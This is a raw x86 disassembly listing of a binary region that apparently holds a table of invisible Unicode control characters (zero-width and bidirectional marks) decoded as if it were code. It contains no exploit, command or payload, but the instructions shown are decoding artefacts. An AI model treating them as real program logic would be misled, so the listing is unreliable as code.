  40961d:	aa                   	stos   %al,%es:(%edi)
  40961e:	e2 81                	loop   0x4095a1
  409620:	af                   	scas   %es:(%edi),%eax
  409621:	e2 80                	loop   0x4095a3
  409623:	8b e2                	mov    %edx,%esp
  409625:	81 ae e2 81 ab e2 80 	subl   $0xe200ae80,-0x1d547e1e(%esi)
  40962c:	ae 00 e2 
  40962f:	81 aa e2 80 aa e2 81 	subl   $0x80e2ad81,-0x1d557f1e(%edx)
  409636:	ad e2 80 
  409639:	8e e2                	mov    %edx,%fs
  40963b:	81 ab e2 81 ab e2 81 	subl   $0x81e2ac81,-0x1d547e1e(%ebx)
  409642:	ac e2 81 
  409645:	af                   	scas   %es:(%edi),%eax
  409646:	e2 81                	loop   0x4095c9
  409648:	ad                   	lods   %ds:(%esi),%eax
  409649:	e2 80                	loop   0x4095cb
  40964b:	8e e2                	mov    %edx,%fs
  40964d:	80 8e e2 80 ac e2 81 	orb    $0x81,-0x1d537f1e(%esi)
  409654:	ae                   	scas   %es:(%edi),%al
  409655:	e2 80                	loop   0x4095d7
  409657:	8e e2                	mov    %edx,%fs
  409659:	80 ae e2 80 ae e2 80 	subb   $0x80,-0x1d517f1e(%esi)
  409660:	8e e2                	mov    %edx,%fs
  409662:	80 ab e2 80 ad e2 80 	subb   $0x80,-0x1d527f1e(%ebx)
  409669:	8b e2                	mov    %edx,%esp
  40966b:	80 ad e2 80 ac e2 81 	subb   $0x81,-0x1d537f1e(%ebp)
  409672:	ac                   	lods   %ds:(%esi),%al
  409673:	e2 81                	loop   0x4095f6
  409675:	ac                   	lods   %ds:(%esi),%al
  409676:	e2 81                	loop   0x4095f9
  409678:	ab                   	stos   %eax,%es:(%edi)
  409679:	e2 80                	loop   0x4095fb
  40967b:	aa                   	stos   %al,%es:(%edi)
  40967c:	e2 81                	loop   0x4095ff
  40967e:	ab                   	stos   %eax,%es:(%edi)
  40967f:	e2 80                	loop   0x409601
  409681:	8b e2                	mov    %edx,%esp
  409683:	81 ab e2 80 ab e2 80 	subl   $0x80e28c80,-0x1d547f1e(%ebx)
  40968a:	8c e2 80 
  40968d:	8f                   	(bad)
  40968e:	e2 80                	loop   0x409610
  409690:	ac                   	lods   %ds:(%esi),%al
  409691:	e2 81                	loop   0x409614
  409693:	ab                   	stos   %eax,%es:(%edi)
  409694:	e2 80                	loop   0x409616
  409696:	ad                   	lods   %ds:(%esi),%eax
  409697:	e2 80                	loop   0x409619
  409699:	ad                   	lods   %ds:(%esi),%eax
  40969a:	e2 80                	loop   0x40961c
  40969c:	8f                   	(bad)
  40969d:	e2 80                	loop   0x40961f
  40969f:	ab                   	stos   %eax,%es:(%edi)
  4096a0:	e2 80                	loop   0x409622
  4096a2:	8d                   	lea    (bad),%esp
  4096a3:	e2 80                	loop   0x409625
  4096a5:	ac                   	lods   %ds:(%esi),%al
  4096a6:	e2 80                	loop   0x409628
  4096a8:	ae                   	scas   %es:(%edi),%al
  4096a9:	00 e2                	add    %ah,%dl
  4096ab:	80 8c e2 80 8d e2 80 	orb    $0xaa,-0x7f1d7280(%edx,%eiz,8)
  4096b2:	aa 
  4096b3:	e2 80                	loop   0x409635
  4096b5:	ab                   	stos   %eax,%es:(%edi)
  4096b6:	e2 80                	loop   0x409638
  4096b8:	ab                   	stos   %eax,%es:(%edi)
  4096b9:	e2 81                	loop   0x40963c
  4096bb:	ad                   	lods   %ds:(%esi),%eax
  4096bc:	e2 81                	loop   0x40963f
  4096be:	ad                   	lods   %ds:(%esi),%eax
  4096bf:	e2 80                	loop   0x409641
  4096c1:	8e e2                	mov    %edx,%fs
  4096c3:	80 8f e2 80 ad e2 80 	orb    $0x80,-0x1d527f1e(%edi)
  4096ca:	8c e2                	mov    %fs,%edx
  4096cc:	80 8d e2 80 8d e2 80 	orb    $0x80,-0x1d727f1e(%ebp)
  4096d3:	ae                   	scas   %es:(%edi),%al
  4096d4:	e2 81                	loop   0x409657
  4096d6:	ab                   	stos   %eax,%es:(%edi)
  4096d7:	e2 81                	loop   0x40965a
  4096d9:	af                   	scas   %es:(%edi),%eax
  4096da:	e2 80                	loop   0x40965c
  4096dc:	8f                   	(bad)
  4096dd:	e2 80                	loop   0x40965f
  4096df:	ac                   	lods   %ds:(%esi),%al
  4096e0:	e2 81                	loop   0x409663
  4096e2:	af                   	scas   %es:(%edi),%eax
  4096e3:	e2 80                	loop   0x409665
  4096e5:	aa                   	stos   %al,%es:(%edi)
  4096e6:	e2 80                	loop   0x409668
  4096e8:	8b e2                	mov    %edx,%esp
  4096ea:	80 8d e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%ebp)
  4096f1:	ab                   	stos   %eax,%es:(%edi)
  4096f2:	e2 80                	loop   0x409674
  4096f4:	8c e2                	mov    %fs,%edx
  4096f6:	80 8d e2 80 8c e2 80 	orb    $0x80,-0x1d737f1e(%ebp)
  4096fd:	8c e2                	mov    %fs,%edx
  4096ff:	80 8e e2 80 8b e2 81 	orb    $0x81,-0x1d747f1e(%esi)
  409706:	ae                   	scas   %es:(%edi),%al
  409707:	e2 81                	loop   0x40968a
  409709:	ae                   	scas   %es:(%edi),%al
  40970a:	e2 80                	loop   0x40968c
  40970c:	ae                   	scas   %es:(%edi),%al
  40970d:	e2 81                	loop   0x409690
  40970f:	ac                   	lods   %ds:(%esi),%al
  409710:	e2 80                	loop   0x409692
  409712:	8e e2                	mov    %edx,%fs
  409714:	81 ad e2 80 8b e2 80 	subl   $0x80e28f80,-0x1d747f1e(%ebp)
  40971b:	8f e2 80 
  40971e:	ac                   	lods   %ds:(%esi),%al
  40971f:	e2 80                	loop   0x4096a1
  409721:	ae                   	scas   %es:(%edi),%al
  409722:	00 e2                	add    %ah,%dl
  409724:	80 ab e2 80 aa e2 81 	subb   $0x81,-0x1d557f1e(%ebx)
  40972b:	ac                   	lods   %ds:(%esi),%al
  40972c:	e2 80                	loop   0x4096ae
  40972e:	ae                   	scas   %es:(%edi),%al
  40972f:	e2 80                	loop   0x4096b1
  409731:	8b e2                	mov    %edx,%esp
  409733:	80 8d e2 80 ae e2 80 	orb    $0x80,-0x1d517f1e(%ebp)
  40973a:	aa                   	stos   %al,%es:(%edi)
  40973b:	e2 81                	loop   0x4096be
  40973d:	aa                   	stos   %al,%es:(%edi)
  40973e:	e2 80                	loop   0x4096c0
  409740:	aa                   	stos   %al,%es:(%edi)
  409741:	e2 81                	loop   0x4096c4
  409743:	ab                   	stos   %eax,%es:(%edi)
  409744:	e2 80                	loop   0x4096c6
  409746:	aa                   	stos   %al,%es:(%edi)
  409747:	e2 81                	loop   0x4096ca
  409749:	af                   	scas   %es:(%edi),%eax
  40974a:	e2 80                	loop   0x4096cc
  40974c:	8f                   	(bad)
  40974d:	e2 81                	loop   0x4096d0
  40974f:	af                   	scas   %es:(%edi),%eax
  409750:	e2 81                	loop   0x4096d3
  409752:	af                   	scas   %es:(%edi),%eax
  409753:	e2 81                	loop   0x4096d6
  409755:	af                   	scas   %es:(%edi),%eax
  409756:	e2 80                	loop   0x4096d8
  409758:	8d                   	lea    (bad),%esp
  409759:	e2 81                	loop   0x4096dc
  40975b:	aa                   	stos   %al,%es:(%edi)
  40975c:	e2 80                	loop   0x4096de
  40975e:	ae                   	scas   %es:(%edi),%al
  40975f:	e2 80                	loop   0x4096e1
  409761:	ae                   	scas   %es:(%edi),%al
  409762:	e2 81                	loop   0x4096e5
  409764:	af                   	scas   %es:(%edi),%eax
  409765:	e2 80                	loop   0x4096e7
  409767:	ac                   	lods   %ds:(%esi),%al
  409768:	e2 81                	loop   0x4096eb
  40976a:	aa                   	stos   %al,%es:(%edi)
  40976b:	e2 81                	loop   0x4096ee
  40976d:	ad                   	lods   %ds:(%esi),%eax
  40976e:	e2 80                	loop   0x4096f0
  409770:	ac                   	lods   %ds:(%esi),%al
  409771:	e2 81                	loop   0x4096f4
  409773:	ac                   	lods   %ds:(%esi),%al
  409774:	e2 80                	loop   0x4096f6
  409776:	ad                   	lods   %ds:(%esi),%eax
  409777:	e2 80                	loop   0x4096f9
  409779:	8c e2                	mov    %fs,%edx
  40977b:	81 ac e2 80 8e e2 80 	subl   $0xab80e2ad,-0x7f1d7180(%edx,%eiz,8)
  409782:	ad e2 80 ab 
  409786:	e2 80                	loop   0x409708
  409788:	8c e2                	mov    %fs,%edx
  40978a:	80 8e e2 81 ae e2 80 	orb    $0x80,-0x1d517e1e(%esi)
  409791:	8e e2                	mov    %edx,%fs
  409793:	80 ad e2 80 aa e2 80 	subb   $0x80,-0x1d557f1e(%ebp)
  40979a:	ac                   	lods   %ds:(%esi),%al
  40979b:	e2 80                	loop   0x40971d
  40979d:	ae                   	scas   %es:(%edi),%al
  40979e:	00 e2                	add    %ah,%dl
  4097a0:	80 aa e2 81 af e2 80 	subb   $0x80,-0x1d507e1e(%edx)
  4097a7:	8b e2                	mov    %edx,%esp
  4097a9:	80 aa e2 80 aa e2 81 	subb   $0x81,-0x1d557f1e(%edx)
  4097b0:	af                   	scas   %es:(%edi),%eax
  4097b1:	e2 81                	loop   0x409734
  4097b3:	ae                   	scas   %es:(%edi),%al
  4097b4:	e2 80                	loop   0x409736
  4097b6:	8e e2                	mov    %edx,%fs
  4097b8:	81 ae e2 81 ab e2 81 	subl   $0x80e2ac81,-0x1d547e1e(%esi)
  4097bf:	ac e2 80 
  4097c2:	ad                   	lods   %ds:(%esi),%eax
  4097c3:	e2 80                	loop   0x409745
  4097c5:	8d                   	lea    (bad),%esp
  4097c6:	e2 80                	loop   0x409748
  4097c8:	8e e2                	mov    %edx,%fs
  4097ca:	80 ac e2 81 ae e2 81 	subb   $0xae,-0x7e1d517f(%edx,%eiz,8)
  4097d1:	ae 
  4097d2:	e2 81                	loop   0x409755
  4097d4:	aa                   	stos   %al,%es:(%edi)
  4097d5:	e2 81                	loop   0x409758
  4097d7:	af                   	scas   %es:(%edi),%eax
  4097d8:	e2 81                	loop   0x40975b
  4097da:	aa                   	stos   %al,%es:(%edi)
  4097db:	e2 81                	loop   0x40975e
  4097dd:	ac                   	lods   %ds:(%esi),%al
  4097de:	e2 80                	loop   0x409760
  4097e0:	ad                   	lods   %ds:(%esi),%eax
  4097e1:	e2 80                	loop   0x409763
  4097e3:	8d                   	lea    (bad),%esp
  4097e4:	e2 80                	loop   0x409766
  4097e6:	8d                   	lea    (bad),%esp
  4097e7:	e2 80                	loop   0x409769
  4097e9:	ae                   	scas   %es:(%edi),%al
  4097ea:	e2 80                	loop   0x40976c
  4097ec:	8c e2                	mov    %fs,%edx
  4097ee:	80 ac e2 80 8b e2 81 	subb   $0xae,-0x7e1d7480(%edx,%eiz,8)
  4097f5:	ae 
  4097f6:	e2 80                	loop   0x409778
  4097f8:	ab                   	stos   %eax,%es:(%edi)
  4097f9:	e2 80                	loop   0x40977b
  4097fb:	8f                   	(bad)
  4097fc:	e2 80                	loop   0x40977e
  4097fe:	8c e2                	mov    %fs,%edx
  409800:	80 ad e2 80 aa e2 81 	subb   $0x81,-0x1d557f1e(%ebp)
  409807:	ae                   	scas   %es:(%edi),%al
  409808:	e2 81                	loop   0x40978b
  40980a:	ab                   	stos   %eax,%es:(%edi)
  40980b:	e2 80                	loop   0x40978d
  40980d:	ad                   	lods   %ds:(%esi),%eax
  40980e:	e2 81                	loop   0x409791
  409810:	ad                   	lods   %ds:(%esi),%eax
  409811:	e2 81                	loop   0x409794
  409813:	aa                   	stos   %al,%es:(%edi)
  409814:	e2 80                	loop   0x409796
  409816:	ac                   	lods   %ds:(%esi),%al
  409817:	e2 80                	loop   0x409799
  409819:	ae                   	scas   %es:(%edi),%al
  40981a:	00 e2                	add    %ah,%dl
  40981c:	80 8e e2 81 ac e2 80 	orb    $0x80,-0x1d537e1e(%esi)
  409823:	ab                   	stos   %eax,%es:(%edi)
  409824:	e2 80                	loop   0x4097a6
  409826:	8b e2                	mov    %edx,%esp
  409828:	80 8d e2 80 8c e2 81 	orb    $0x81,-0x1d737f1e(%ebp)
  40982f:	ac                   	lods   %ds:(%esi),%al
  409830:	e2 81                	loop   0x4097b3
  409832:	af                   	scas   %es:(%edi),%eax
  409833:	e2 81                	loop   0x4097b6
  409835:	ac                   	lods   %ds:(%esi),%al
  409836:	e2 80                	loop   0x4097b8
  409838:	ae                   	scas   %es:(%edi),%al
  409839:	e2 80                	loop   0x4097bb
  40983b:	8b e2                	mov    %edx,%esp
  40983d:	80 ad e2 81 af e2 81 	subb   $0x81,-0x1d507e1e(%ebp)
  409844:	aa                   	stos   %al,%es:(%edi)
  409845:	e2 81                	loop   0x4097c8
  409847:	af                   	scas   %es:(%edi),%eax
  409848:	e2 81                	loop   0x4097cb
  40984a:	ad                   	lods   %ds:(%esi),%eax
  40984b:	e2 81                	loop   0x4097ce
  40984d:	ad                   	lods   %ds:(%esi),%eax
  40984e:	e2 80                	loop   0x4097d0
  409850:	8f                   	(bad)
  409851:	e2 80                	loop   0x4097d3
  409853:	8b e2                	mov    %edx,%esp
  409855:	80 8d e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%ebp)
  40985c:	8d                   	lea    (bad),%esp
  40985d:	e2 80                	loop   0x4097df
  40985f:	ad                   	lods   %ds:(%esi),%eax
  409860:	e2 81                	loop   0x4097e3
  409862:	ae                   	scas   %es:(%edi),%al
  409863:	e2 81                	loop   0x4097e6
  409865:	ae                   	scas   %es:(%edi),%al
  409866:	e2 80                	loop   0x4097e8
  409868:	aa                   	stos   %al,%es:(%edi)
  409869:	e2 80                	loop   0x4097eb
  40986b:	ac                   	lods   %ds:(%esi),%al
  40986c:	e2 80                	loop   0x4097ee
  40986e:	ab                   	stos   %eax,%es:(%edi)
  40986f:	e2 81                	loop   0x4097f2
  409871:	ac                   	lods   %ds:(%esi),%al
  409872:	e2 80                	loop   0x4097f4
  409874:	8b e2                	mov    %edx,%esp
  409876:	81 ac e2 81 af e2 81 	subl   $0x8e80e2ab,-0x7e1d507f(%edx,%eiz,8)
  40987d:	ab e2 80 8e 
  409881:	e2 80                	loop   0x409803
  409883:	ad                   	lods   %ds:(%esi),%eax
  409884:	e2 80                	loop   0x409806
  409886:	8e e2                	mov    %edx,%fs
  409888:	80 ae e2 80 8d e2 81 	subb   $0x81,-0x1d727f1e(%esi)
  40988f:	ad                   	lods   %ds:(%esi),%eax
  409890:	e2 80                	loop   0x409812
  409892:	ac                   	lods   %ds:(%esi),%al
  409893:	e2 80                	loop   0x409815
  409895:	ae                   	scas   %es:(%edi),%al
  409896:	00 e2                	add    %ah,%dl
  409898:	81 ab e2 81 ab e2 81 	subl   $0x81e2ac81,-0x1d547e1e(%ebx)
  40989f:	ac e2 81 
  4098a2:	ae                   	scas   %es:(%edi),%al
  4098a3:	e2 80                	loop   0x409825
  4098a5:	8d                   	lea    (bad),%esp
  4098a6:	e2 80                	loop   0x409828
  4098a8:	aa                   	stos   %al,%es:(%edi)
  4098a9:	e2 81                	loop   0x40982c
  4098ab:	ad                   	lods   %ds:(%esi),%eax
  4098ac:	e2 80                	loop   0x40982e
  4098ae:	aa                   	stos   %al,%es:(%edi)
  4098af:	e2 80                	loop   0x409831
  4098b1:	8b e2                	mov    %edx,%esp
  4098b3:	80 8b e2 80 8e e2 81 	orb    $0x81,-0x1d717f1e(%ebx)
  4098ba:	ac                   	lods   %ds:(%esi),%al
  4098bb:	e2 80                	loop   0x40983d
  4098bd:	ae                   	scas   %es:(%edi),%al
  4098be:	e2 80                	loop   0x409840
  4098c0:	8b e2                	mov    %edx,%esp
  4098c2:	81 aa e2 80 8d e2 81 	subl   $0x80e2ad81,-0x1d727f1e(%edx)
  4098c9:	ad e2 80 
  4098cc:	8f                   	(bad)
  4098cd:	e2 80                	loop   0x40984f
  4098cf:	ac                   	lods   %ds:(%esi),%al
  4098d0:	e2 80                	loop   0x409852
  4098d2:	ac                   	lods   %ds:(%esi),%al
  4098d3:	e2 81                	loop   0x409856
  4098d5:	aa                   	stos   %al,%es:(%edi)
  4098d6:	e2 81                	loop   0x409859
  4098d8:	aa                   	stos   %al,%es:(%edi)
  4098d9:	e2 81                	loop   0x40985c
  4098db:	ab                   	stos   %eax,%es:(%edi)
  4098dc:	e2 80                	loop   0x40985e
  4098de:	8c e2                	mov    %fs,%edx
  4098e0:	81 aa e2 81 af e2 81 	subl   $0x80e2ac81,-0x1d507e1e(%edx)
  4098e7:	ac e2 80 
  4098ea:	8e e2                	mov    %edx,%fs
  4098ec:	80 8e e2 80 8b e2 81 	orb    $0x81,-0x1d747f1e(%esi)
  4098f3:	ab                   	stos   %eax,%es:(%edi)
  4098f4:	e2 80                	loop   0x409876
  4098f6:	aa                   	stos   %al,%es:(%edi)
  4098f7:	e2 80                	loop   0x409879
  4098f9:	ac                   	lods   %ds:(%esi),%al
  4098fa:	e2 81                	loop   0x40987d
  4098fc:	af                   	scas   %es:(%edi),%eax
  4098fd:	e2 80                	loop   0x40987f
  4098ff:	ab                   	stos   %eax,%es:(%edi)
  409900:	e2 81                	loop   0x409883
  409902:	ac                   	lods   %ds:(%esi),%al
  409903:	e2 80                	loop   0x409885
  409905:	8d                   	lea    (bad),%esp
  409906:	e2 81                	loop   0x409889
  409908:	ad                   	lods   %ds:(%esi),%eax
  409909:	e2 81                	loop   0x40988c
  40990b:	ae                   	scas   %es:(%edi),%al
  40990c:	e2 80                	loop   0x40988e
  40990e:	ac                   	lods   %ds:(%esi),%al
  40990f:	e2 80                	loop   0x409891
  409911:	ae                   	scas   %es:(%edi),%al
  409912:	00 e2                	add    %ah,%dl
  409914:	80 ad e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%ebp)
  40991b:	8d                   	lea    (bad),%esp
  40991c:	e2 81                	loop   0x40989f
  40991e:	af                   	scas   %es:(%edi),%eax
  40991f:	e2 80                	loop   0x4098a1
  409921:	8d                   	lea    (bad),%esp
  409922:	e2 81                	loop   0x4098a5
  409924:	af                   	scas   %es:(%edi),%eax
  409925:	e2 80                	loop   0x4098a7
  409927:	8c e2                	mov    %fs,%edx
  409929:	80 8d e2 80 ae e2 80 	orb    $0x80,-0x1d517f1e(%ebp)
  409930:	8e e2                	mov    %edx,%fs
  409932:	80 8d e2 81 ad e2 81 	orb    $0x81,-0x1d527e1e(%ebp)
  409939:	ac                   	lods   %ds:(%esi),%al
  40993a:	e2 80                	loop   0x4098bc
  40993c:	8c e2                	mov    %fs,%edx
  40993e:	80 8f e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%edi)
  409945:	8c e2                	mov    %fs,%edx
  409947:	80 ae e2 80 aa e2 80 	subb   $0x80,-0x1d557f1e(%esi)
  40994e:	ad                   	lods   %ds:(%esi),%eax
  40994f:	e2 80                	loop   0x4098d1
  409951:	ae                   	scas   %es:(%edi),%al
  409952:	e2 80                	loop   0x4098d4
  409954:	aa                   	stos   %al,%es:(%edi)
  409955:	e2 81                	loop   0x4098d8
  409957:	af                   	scas   %es:(%edi),%eax
  409958:	e2 81                	loop   0x4098db
  40995a:	af                   	scas   %es:(%edi),%eax
  40995b:	e2 80                	loop   0x4098dd
  40995d:	aa                   	stos   %al,%es:(%edi)
  40995e:	e2 80                	loop   0x4098e0
  409960:	ae                   	scas   %es:(%edi),%al
  409961:	e2 80                	loop   0x4098e3
  409963:	8e e2                	mov    %edx,%fs
  409965:	81 af e2 80 8c e2 80 	subl   $0x80e2ac80,-0x1d737f1e(%edi)
  40996c:	ac e2 80 
  40996f:	ae                   	scas   %es:(%edi),%al
  409970:	e2 81                	loop   0x4098f3
  409972:	ad                   	lods   %ds:(%esi),%eax
  409973:	e2 80                	loop   0x4098f5
  409975:	ae                   	scas   %es:(%edi),%al
  409976:	e2 81                	loop   0x4098f9
  409978:	aa                   	stos   %al,%es:(%edi)
  409979:	e2 80                	loop   0x4098fb
  40997b:	8f                   	(bad)
  40997c:	e2 80                	loop   0x4098fe
  40997e:	ab                   	stos   %eax,%es:(%edi)
  40997f:	e2 81                	loop   0x409902
  409981:	ab                   	stos   %eax,%es:(%edi)
  409982:	e2 80                	loop   0x409904
  409984:	8f                   	(bad)
  409985:	e2 80                	loop   0x409907
  409987:	8b e2                	mov    %edx,%esp
  409989:	81 ac e2 80 ae 00 e2 	subl   $0x80e2ad81,-0x1dff5180(%edx,%eiz,8)
  409990:	81 ad e2 80 
  409994:	8b e2                	mov    %edx,%esp
  409996:	80 ae e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%esi)
  40999d:	8e e2                	mov    %edx,%fs
  40999f:	81 ac e2 80 ac e2 81 	subl   $0xad81e2ad,-0x7e1d5380(%edx,%eiz,8)
  4099a6:	ad e2 81 ad 
  4099aa:	e2 80                	loop   0x40992c
  4099ac:	8d                   	lea    (bad),%esp
  4099ad:	e2 81                	loop   0x409930
  4099af:	ae                   	scas   %es:(%edi),%al
  4099b0:	e2 81                	loop   0x409933
  4099b2:	aa                   	stos   %al,%es:(%edi)
  4099b3:	e2 81                	loop   0x409936
  4099b5:	aa                   	stos   %al,%es:(%edi)
  4099b6:	e2 80                	loop   0x409938
  4099b8:	8d                   	lea    (bad),%esp
  4099b9:	e2 80                	loop   0x40993b
  4099bb:	8e e2                	mov    %edx,%fs
  4099bd:	81 ab e2 80 ab e2 81 	subl   $0x81e2aa81,-0x1d547f1e(%ebx)
  4099c4:	aa e2 81 
  4099c7:	ae                   	scas   %es:(%edi),%al
  4099c8:	e2 81                	loop   0x40994b
  4099ca:	ac                   	lods   %ds:(%esi),%al
  4099cb:	e2 81                	loop   0x40994e
  4099cd:	af                   	scas   %es:(%edi),%eax
  4099ce:	e2 80                	loop   0x409950
  4099d0:	8b e2                	mov    %edx,%esp
  4099d2:	81 ab e2 80 ac e2 81 	subl   $0x80e2ae81,-0x1d537f1e(%ebx)
  4099d9:	ae e2 80 
  4099dc:	aa                   	stos   %al,%es:(%edi)
  4099dd:	e2 81                	loop   0x409960
  4099df:	af                   	scas   %es:(%edi),%eax
  4099e0:	e2 80                	loop   0x409962
  4099e2:	ab                   	stos   %eax,%es:(%edi)
  4099e3:	e2 80                	loop   0x409965
  4099e5:	ac                   	lods   %ds:(%esi),%al
  4099e6:	e2 80                	loop   0x409968
  4099e8:	8f                   	(bad)
  4099e9:	e2 81                	loop   0x40996c
  4099eb:	aa                   	stos   %al,%es:(%edi)
  4099ec:	e2 80                	loop   0x40996e
  4099ee:	8c e2                	mov    %fs,%edx
  4099f0:	80 8b e2 80 8f e2 81 	orb    $0x81,-0x1d707f1e(%ebx)
  4099f7:	ac                   	lods   %ds:(%esi),%al
  4099f8:	e2 81                	loop   0x40997b
  4099fa:	ac                   	lods   %ds:(%esi),%al
  4099fb:	e2 80                	loop   0x40997d
  4099fd:	8b e2                	mov    %edx,%esp
  4099ff:	81 aa e2 81 ac e2 81 	subl   $0x80e2ac81,-0x1d537e1e(%edx)
  409a06:	ac e2 80 
  409a09:	ae                   	scas   %es:(%edi),%al
  409a0a:	00 e2                	add    %ah,%dl
  409a0c:	80 8f e2 80 ac e2 80 	orb    $0x80,-0x1d537f1e(%edi)
  409a13:	8b e2                	mov    %edx,%esp
  409a15:	80 8b e2 80 8b e2 80 	orb    $0x80,-0x1d747f1e(%ebx)
  409a1c:	8d                   	lea    (bad),%esp
  409a1d:	e2 80                	loop   0x40999f
  409a1f:	ad                   	lods   %ds:(%esi),%eax
  409a20:	e2 81                	loop   0x4099a3
  409a22:	ac                   	lods   %ds:(%esi),%al
  409a23:	e2 80                	loop   0x4099a5
  409a25:	ad                   	lods   %ds:(%esi),%eax
  409a26:	e2 81                	loop   0x4099a9
  409a28:	ab                   	stos   %eax,%es:(%edi)
  409a29:	e2 81                	loop   0x4099ac
  409a2b:	af                   	scas   %es:(%edi),%eax
  409a2c:	e2 80                	loop   0x4099ae
  409a2e:	8b e2                	mov    %edx,%esp
  409a30:	80 8b e2 80 aa e2 81 	orb    $0x81,-0x1d557f1e(%ebx)
  409a37:	aa                   	stos   %al,%es:(%edi)
  409a38:	e2 80                	loop   0x4099ba
  409a3a:	8e e2                	mov    %edx,%fs
  409a3c:	81 ae e2 80 ad e2 81 	subl   $0x80e2ad81,-0x1d527f1e(%esi)
  409a43:	ad e2 80 
  409a46:	8f                   	(bad)
  409a47:	e2 80                	loop   0x4099c9
  409a49:	8c e2                	mov    %fs,%edx
  409a4b:	81 ad e2 81 af e2 81 	subl   $0x81e2ad81,-0x1d507e1e(%ebp)
  409a52:	ad e2 81 
  409a55:	ac                   	lods   %ds:(%esi),%al
  409a56:	e2 80                	loop   0x4099d8
  409a58:	8f                   	(bad)
  409a59:	e2 81                	loop   0x4099dc
  409a5b:	ae                   	scas   %es:(%edi),%al
  409a5c:	e2 81                	loop   0x4099df
  409a5e:	af                   	scas   %es:(%edi),%eax
  409a5f:	e2 80                	loop   0x4099e1
  409a61:	8e e2                	mov    %edx,%fs
  409a63:	81 ad e2 81 ab e2 80 	subl   $0x81e2aa80,-0x1d547e1e(%ebp)
  409a6a:	aa e2 81 
  409a6d:	ab                   	stos   %eax,%es:(%edi)
  409a6e:	e2 81                	loop   0x4099f1
  409a70:	af                   	scas   %es:(%edi),%eax
  409a71:	e2 80                	loop   0x4099f3
  409a73:	ac                   	lods   %ds:(%esi),%al
  409a74:	e2 80                	loop   0x4099f6
  409a76:	8c e2                	mov    %fs,%edx
  409a78:	80 8d e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%ebp)
  409a7f:	ad                   	lods   %ds:(%esi),%eax
  409a80:	e2 81                	loop   0x409a03
  409a82:	ac                   	lods   %ds:(%esi),%al
  409a83:	e2 80                	loop   0x409a05
  409a85:	ae                   	scas   %es:(%edi),%al
  409a86:	00 e2                	add    %ah,%dl
  409a88:	80 aa e2 80 8f e2 81 	subb   $0x81,-0x1d707f1e(%edx)
  409a8f:	ac                   	lods   %ds:(%esi),%al
  409a90:	e2 80                	loop   0x409a12
  409a92:	8d                   	lea    (bad),%esp
  409a93:	e2 80                	loop   0x409a15
  409a95:	8c e2                	mov    %fs,%edx
  409a97:	80 ab e2 80 ab e2 81 	subb   $0x81,-0x1d547f1e(%ebx)
  409a9e:	ae                   	scas   %es:(%edi),%al
  409a9f:	e2 81                	loop   0x409a22
  409aa1:	ae                   	scas   %es:(%edi),%al
  409aa2:	e2 80                	loop   0x409a24
  409aa4:	8b e2                	mov    %edx,%esp
  409aa6:	80 ae e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%esi)
  409aad:	aa                   	stos   %al,%es:(%edi)
  409aae:	e2 81                	loop   0x409a31
  409ab0:	af                   	scas   %es:(%edi),%eax
  409ab1:	e2 81                	loop   0x409a34
  409ab3:	af                   	scas   %es:(%edi),%eax
  409ab4:	e2 80                	loop   0x409a36
  409ab6:	8d                   	lea    (bad),%esp
  409ab7:	e2 81                	loop   0x409a3a
  409ab9:	ab                   	stos   %eax,%es:(%edi)
  409aba:	e2 80                	loop   0x409a3c
  409abc:	8b e2                	mov    %edx,%esp
  409abe:	80 8c e2 81 aa e2 81 	orb    $0xaa,-0x7e1d557f(%edx,%eiz,8)
  409ac5:	aa 
  409ac6:	e2 81                	loop   0x409a49
  409ac8:	ab                   	stos   %eax,%es:(%edi)
  409ac9:	e2 81                	loop   0x409a4c
  409acb:	ae                   	scas   %es:(%edi),%al
  409acc:	e2 81                	loop   0x409a4f
  409ace:	ac                   	lods   %ds:(%esi),%al
  409acf:	e2 80                	loop   0x409a51
  409ad1:	8b e2                	mov    %edx,%esp
  409ad3:	81 af e2 80 aa e2 81 	subl   $0x81e2ab81,-0x1d557f1e(%edi)
  409ada:	ab e2 81 
  409add:	af                   	scas   %es:(%edi),%eax
  409ade:	e2 81                	loop   0x409a61
  409ae0:	ab                   	stos   %eax,%es:(%edi)
  409ae1:	e2 80                	loop   0x409a63
  409ae3:	aa                   	stos   %al,%es:(%edi)
  409ae4:	e2 80                	loop   0x409a66
  409ae6:	ad                   	lods   %ds:(%esi),%eax
  409ae7:	e2 80                	loop   0x409a69
  409ae9:	aa                   	stos   %al,%es:(%edi)
  409aea:	e2 80                	loop   0x409a6c
  409aec:	8f                   	(bad)
  409aed:	e2 80                	loop   0x409a6f
  409aef:	ad                   	lods   %ds:(%esi),%eax
  409af0:	e2 80                	loop   0x409a72
  409af2:	aa                   	stos   %al,%es:(%edi)
  409af3:	e2 80                	loop   0x409a75
  409af5:	8b e2                	mov    %edx,%esp
  409af7:	80 ae e2 81 ad e2 81 	subb   $0x81,-0x1d527e1e(%esi)
  409afe:	ac                   	lods   %ds:(%esi),%al
  409aff:	e2 80                	loop   0x409a81
  409b01:	ae                   	scas   %es:(%edi),%al
  409b02:	00 e2                	add    %ah,%dl
  409b04:	81 ac e2 80 8f e2 80 	subl   $0x8d80e28b,-0x7f1d7080(%edx,%eiz,8)
  409b0b:	8b e2 80 8d 
  409b0f:	e2 81                	loop   0x409a92
  409b11:	ac                   	lods   %ds:(%esi),%al
  409b12:	e2 80                	loop   0x409a94
  409b14:	ae                   	scas   %es:(%edi),%al
  409b15:	e2 81                	loop   0x409a98
  409b17:	af                   	scas   %es:(%edi),%eax
  409b18:	e2 81                	loop   0x409a9b
  409b1a:	aa                   	stos   %al,%es:(%edi)
  409b1b:	e2 80                	loop   0x409a9d
  409b1d:	ad                   	lods   %ds:(%esi),%eax
  409b1e:	e2 80                	loop   0x409aa0
  409b20:	8b e2                	mov    %edx,%esp
  409b22:	81 af e2 80 8c e2 80 	subl   $0x80e2ad80,-0x1d737f1e(%edi)
  409b29:	ad e2 80 
  409b2c:	8c e2                	mov    %fs,%edx
  409b2e:	80 ac e2 81 ac e2 80 	subb   $0x8b,-0x7f1d537f(%edx,%eiz,8)
  409b35:	8b 
  409b36:	e2 80                	loop   0x409ab8
  409b38:	8e e2                	mov    %edx,%fs
